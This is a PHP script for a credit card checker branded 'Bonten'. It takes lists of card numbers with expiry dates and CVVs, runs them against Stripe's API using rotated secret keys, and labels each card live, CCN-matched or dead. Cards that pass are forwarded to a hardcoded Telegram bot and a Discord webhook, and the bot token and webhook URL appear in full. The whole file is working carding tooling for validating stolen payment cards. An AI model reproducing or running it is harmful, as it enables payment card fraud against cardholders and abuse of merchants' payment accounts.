<?php
session_start();  
include("config.php");
error_reporting(0);

if(!isset($_SESSION['use'])){
echo "Please use the checker instead !";
exit;
} 
#################[ CC and SK ]#################
list($cc, $mm, $yy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['lista']));
$card = "$cc|$mm|$yy|$cvv";

$bin = substr($cc, 0, 6);
$algo = substr($cc, 0, 12);

if (strlen($yy) == 2) {
  $yy = "20".$yy;
  $yyy = $yy;
}
else {
  $yyy = substr($yy, 2);
}

if((!$cc)||(!$mm)|(!$yy)||(!$cvv) or (strlen($cc)<15)||(strlen($cvv)<3)){
  echo '<span class="badge bg-warning text-dark">Notice</span> <span class="badge bg-light text-dark">Invalid Card Info!</span>';
  exit;
} if((substr($cc, 0, 1) == 1) || (substr($cc, 0, 1) == 2) || (substr($cc, 0, 1) == 7) || (substr($cc, 0, 1) == 8) || (substr($cc, 0, 1) == 9)){
  echo '<span class="badge bg-warning text-dark">Notice</span> <span class="badge bg-light text-dark">Invalid Card Info!</span>';
  exit;
}

$sklive = $keys[array_rand($keys)];
#################[ REQS ]#################
$ch = curl_init('https://raiixpoints.ruyichann.repl.co/api/bin/'.substr($cc, 0, 6));
curl_setopt_array($ch, array(CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$curl4 = curl_exec($ch);

$level = trim(strip_tags(g($curl4, '"level":"','"')));
$bank = trim(strip_tags(g($curl4, '"bank":"','"')));
$country = trim(strip_tags(g($curl4, '"country":"','"')));
$binDetails = ''.substr($cc, 0, 6).' | '.$bank.' - '.$type.' - '.$country.'';
##################################
$ch = curl_init('https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
$postfield = 'type=card&owner[name]=Jeff Arkerman&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl = curl_exec($ch);

$token = trim(strip_tags(g($curl, '"id": "src_','"')));
$code_src = trim(strip_tags(g($curl, '"code": "','"')));
$message_src = trim(strip_tags(g($curl, '"message": "','"')));
$dcode_src = trim(strip_tags(g($curl, '"decline_code": "','"')));
if(!$code_src){
  $code_src = "null";
} if(!$dcode_src){
  $dcode_src = "null";
}

if(!$cus){
  if(isset($dcode_cus)){
    if(strpos($code_cus, "incorrect_cvc")){
      echo '<span class="badge bg-warning text-dark">#CCN</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CCN Matched</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    } elseif(strpos($code_cus, "insufficient_funds")){
      echo '<span class="badge bg-success">#CVV</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched => insufficient_funds</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
      exit;
    }
  } else {
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">ID "cus_" not found. ('.$code_cus.' '.$message_cus.')</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    exit;
  }
}

$msg = trim(strip_tags(g($curl, '"message": "','"')));
if(!$msg){
    $msg = "null";
}
$code = trim(strip_tags(g($curl, '"code": "','"')));
if(!$code){
    $code = "null";
}
$dcode = trim(strip_tags(g($curl, '"decline_code": "','"')));
if(!$dcode){
    $dcode = "null";
}
##################################
$ch = curl_init('https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
$postfield = 'description=Jeff Arkerman&source=src_'.$token.'';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl2 = curl_exec($ch);

$cus = trim(strip_tags(g($curl2, '"id": "cus_','"')));
$code_cus = trim(strip_tags(g($curl2, '"code": "','"')));
$message_cus = trim(strip_tags(g($curl2, '"message": "','"')));
$dcode_cus = trim(strip_tags(g($curl2, '"decline_code": "','"')));
if(!$code_cus){
  $code_cus = "null";
} if(!$dcode_cus){
  $dcode_cus = "null";
}

if(!$cus){
  if(isset($dcode_cus)){
    if(strpos($code_cus, "incorrect_cvc")){
      echo '<span class="badge bg-warning text-dark">#CCN</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CCN Matched</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    } elseif(strpos($code_cus, "insufficient_funds")){
      echo '<span class="badge bg-success">#CVV</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched => insufficient_funds</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
      exit;
    }
  } else {
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">ID "cus_" not found. ('.$code_cus.' '.$message_cus.')</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    exit;
  }
}

$msg_1 = trim(strip_tags(g($curl2, '"message": "','"')));
if(!$msg_1){
    $msg_1 = "null";
}
$cvc_check_1 = trim(strip_tags(g($curl2, '"cvc_check": "','"')));
if(!$cvc_check_1){
    $cvc_check_1 = "null";
}
$dcode_1 = trim(strip_tags(g($curl2, '"decline_code": "','"')));
if(!$dcode_1){
    $dcode_1 = "null";
}
$code_1 = trim(strip_tags(g($curl2, '"code": "','"')));
if(!$code_1){
    $code_1 = "null";
}
##################################
if ((strpos($curl2, '"cvc_check": "pass"')) || (strpos($curl3, '"cvc_check": "pass"')) || (strpos($curl, '"cvc_check": "pass"'))){
  if($dcode_1 == "generic_decline"){
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched (generic_decline)</span> <span class="badge rounded-pill bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    exit;  
  } else {
    $msg_2 = urlencode("<code>$card</code> ~ CVV Matched ($dcode_3 ~ $code_03 | $dcode_1 ~ $code_1) ~ <b>Country:</b> $country ~ <b>Level</b>: $level");
    sendLive($chatId, $msg_2);  
    sendLiveToDiscord("`$card ` ~ CVV Matched ($dcode_3 ~ $code_03 | $dcode_1 ~ $code_1) ~ **Country:** $country");
    echo '<span class="badge bg-success">#CVV</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched => ('.$code_1.') '.$code_1.'</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    exit;  
  }
} else  if ((strpos($curl2, 'insufficient_funds')) || (strpos($curl3, 'insufficient_funds'))){
  echo '<span class="badge bg-success">#CVV</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched => insufficient_funds</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
  exit;
} else if ((strpos($curl2, 'incorrect_cvc')) || (strpos($curl2, "You card's security code is incorrect.")) || (strpos($curl, 'incorrect_cvc'))){
  echo '<span class="badge bg-warning text-dark">#CCN</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CCN Matched</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
   exit;
} else if ((strpos($curl, 'generic_decline')) || (strpos($curl2, 'generic_decline')) || (strpos($curl, 'generic_decline'))){
  echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">Your card was declined. generic_decline</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
} else if((strpos($curl, 'rate_limit')) || (strpos($curl2, 'rate_limit')) || (strpos($curl2, 'rate_limit'))){
  echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">Your card was declined. Rate Limit</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
  exit;
} else {
  echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">Your card was declined. | Req1: '.$msg.' '.$code.' ('.$dcode.') | Req2: '.$msg_1.' '.$code_1.' ('.$dcode_1.')</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
  exit;
}
#################[ FUNCTIONS ]#################
function g($string, $start, $end) {
 return explode($end, explode($start, $string)[1])[0];
}
function st($string) {
 return strip_tags($string);
}
function t($string){
 return trim($string);
}

function sendLive($chatId, $msg){
  $url = "https://api.telegram.org/bot2093909969:AAFrhTZeWp2GBws9tamVL6l3Ai4P4xDQu50/sendMessage?chat_id=-1001437847049&text=".$msg."&parse_mode=HTML";
  file_get_contents($url);
}
function sendLiveToDiscord($msg){
  $url = "https://discord.com/api/webhooks/901706381663547475/Obl7eFt70QZP_Awfo2aFGgb67ouLF76ZkNK29uUBCAnSh5lWnfQMSguroTDg6KHsqEfP";
  $headers = [ 'Content-Type: application/json; charset=utf-8' ];
  $POST = [ 'username' => 'Forward', 'content' => $msg ];

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
  $response = curl_exec($ch);
}
?>